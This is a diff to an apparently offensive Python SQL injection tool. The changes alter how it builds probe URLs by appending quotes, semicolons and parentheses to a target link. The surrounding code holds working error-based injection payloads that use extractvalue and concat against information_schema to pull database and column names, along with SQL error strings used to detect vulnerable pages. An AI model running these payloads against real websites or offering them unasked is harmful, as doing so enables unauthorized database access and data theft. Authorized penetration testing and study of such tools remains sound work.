@@ -9,7 +9,7 @@ from bs4 import BeautifulSoup as BS
 
 def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name):
     if args.test:
-        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
+        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test + ")", args.test + "')", args.test + '")', args.test + '*'] 
         vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
         try:
             for url in urls:
@@ -41,7 +41,8 @@ def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
         print('Extracting Columns...')
         link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + args.colum_name + "'limit 0,1)))--"
         results = requests.get(link)
-        data = results.text 
+        data = results.text
+        
         print(f"Column names: {data}")
     elif args.dbname:
         link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
@@ -59,7 +60,7 @@ def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
         else:
             print(f"Database name: {str3}")
     elif args.get_database_type:
-        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type[:-4] + ")", args.get_database_type[:-4] + "')", args.get_database_type[:-4] + '")', args.get_database_type[:-4] + '*']
+        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type + ")", args.get_database_type + "')", args.get_database_type + '")', args.get_database_type + '*']
         DBDict = {
             "MySQL"             : ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()'],
             "PostGre"           : ['dafafdfds'],
